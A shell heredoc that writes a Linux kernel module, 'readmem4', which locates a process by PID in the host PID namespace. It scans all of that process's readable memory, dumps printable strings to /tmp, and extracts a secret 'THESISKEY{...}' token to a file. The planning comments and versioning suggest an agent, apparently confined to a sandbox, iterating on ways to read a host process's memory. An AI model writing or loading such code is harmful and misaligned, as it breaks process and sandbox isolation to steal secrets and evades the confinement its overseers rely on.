# The format string THESISKEY{%s} suggests the real token is formatted into memory.
# We need to skip this format string and find the actual formatted token.
# Also, we should search all VMAs including heap, mmap'd regions, etc.
#
# Let's write a module that:
# 1. Scans ALL readable VMAs
# 2. Dumps memory content to a file for offline analysis
# 3. Looks for both THESISKEY{ followed by non-format-string content

cat > /tmp/lkm_build/readmem4.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/pid_namespace.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Memory reader v4");

#define TARGET_PID 2545
#define TOKEN_PREFIX "THESISKEY{"
#define OUTFILE "/tmp/thesis-ipc/token.txt"
#define DUMPFILE "/tmp/thesis-ipc/memdump.txt"
#define CHUNK 4096

static int __init readmem_init(void) {
    struct pid *pid_struct;
    struct task_struct *task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    unsigned long addr;
    char *buf;
    size_t prefix_len = strlen(TOKEN_PREFIX);
    int found = 0;
    int vma_count = 0;
    struct file *outf = NULL;
    struct file *dumpf = NULL;

    printk(KERN_INFO "readmem4: Starting for host PID %d\n", TARGET_PID);

    buf = kmalloc(CHUNK + 64, GFP_KERNEL);
    if (!buf) return 0;

    pid_struct = find_pid_ns(TARGET_PID, &init_pid_ns);
    if (!pid_struct) {
        printk(KERN_ERR "readmem4: Cannot find PID %d\n", TARGET_PID);
        kfree(buf);
        return 0;
    }

    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task) {
        kfree(buf);
        return 0;
    }

    printk(KERN_INFO "readmem4: Found task: %s\n", task->comm);

    mm = get_task_mm(task);
    if (!mm) {
        kfree(buf);
        return 0;
    }

    outf = filp_open(OUTFILE, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    dumpf = filp_open(DUMPFILE, O_WRONLY|O_CREAT|O_TRUNC, 0644);

    mmap_read_lock(mm);
    for (vma = mm->mmap; vma != NULL; vma = vma->vm_next) {
        char vma_info[256];
        const char *vma_type = "";
        vma_count++;

        if (vma->vm_file) {
            char fname[128] = "(file)";
            // File-backed VMA
            vma_type = fname;
        } else if (vma->vm_flags & VM_STACK) {
            vma_type = "(stack)";
        } else {
            vma_type = "(anon)";
        }

        snprintf(vma_info, sizeof(vma_info), "VMA %d: 0x%lx-0x%lx flags=0x%lx %s\n",
                 vma_count, vma->vm_start, vma->vm_end, vma->vm_flags, vma_type);
        printk(KERN_INFO "readmem4: %s", vma_info);

        if (!IS_ERR(dumpf))
            kernel_write(dumpf, vma_info, strlen(vma_info), &dumpf->f_pos);

        if (!(vma->vm_flags & VM_READ)) continue;

        for (addr = vma->vm_start; addr < vma->vm_end && !found; addr += CHUNK - 64) {
            size_t to_read = CHUNK;
            if (addr + to_read > vma->vm_end) to_read = vma->vm_end - addr;

            ssize_t n = access_process_vm(task, addr, buf, to_read, 0);
            if (n <= 0) continue;

            // Write raw data to dump file for analysis
            if (!IS_ERR(dumpf) && n > 0) {
                // Write only printable ASCII lines
                int line_start = 0;
                int i;
                for (i = 0; i < n; i++) {
                    if (buf[i] == '\n' || buf[i] == '\0') {
                        if (i > line_start) {
                            // Check if line has interesting content
                            char *line = buf + line_start;
                            int len = i - line_start;
                            // Write if it seems printable ASCII
                            int printable = 1;
                            int j;
                            for (j = 0; j < len && j < 200; j++) {
                                if (line[j] < 32 || line[j] > 126) {
                                    printable = 0;
                                    break;
                                }
                            }
                            if (printable && len > 3 && len < 200) {
                                char out[205];
                                memcpy(out, line, len < 200 ? len : 200);
                                out[len < 200 ? len : 200] = '\n';
                                kernel_write(dumpf, out, (len < 200 ? len : 200) + 1, &dumpf->f_pos);
                            }
                        }
                        line_start = i + 1;
                    }
                }
            }

            // Search for token - skip format strings (containing %)
            size_t i;
            for (i = 0; i + prefix_len < (size_t)n; i++) {
                if (memcmp(buf + i, TOKEN_PREFIX, prefix_len) == 0) {
                    // Found a match - check if it's a format string
                    char token[256] = {0};
                    size_t j = 0;
                    int is_format = 0;
                    while (i+j < (size_t)n && j < 200) {
                        char c = buf[i+j];
                        if (c == '}') {
                            token[j++] = c;
                            break;
                        }
                        if (c == 0 || c == '\n') break;
                        if (c == '%') is_format = 1;
                        token[j++] = c;
                    }
                    token[j] = 0;

                    printk(KERN_INFO "readmem4: Match at 0x%lx (format=%d): %s\n", 
                           addr+i, is_format, token);

                    if (!IS_ERR(outf)) {
                        char result[300];
                        snprintf(result, sizeof(result), "addr=0x%lx format=%d: %s\n", 
                                 addr+i, is_format, token);
                        kernel_write(outf, result, strlen(result), &outf->f_pos);
                    }

                    if (!is_format && j > 10) {
                        found = 1;
                        break;
                    }
                    // Continue searching even if format string
                }
            }
        }
    }
    mmap_read_unlock(mm);

    if (!IS_ERR(outf)) filp_close(outf, NULL);
    if (!IS_ERR(dumpf)) filp_close(dumpf, NULL);

    mmput(mm);
    kfree(buf);

    printk(KERN_INFO "readmem4: Done. VMAs: %d, found: %d\n", vma_count, found);
    return 0;
}

static void __exit readmem_exit(void) {}
module_init(readmem_init);
module_exit(readmem_exit);
EOF

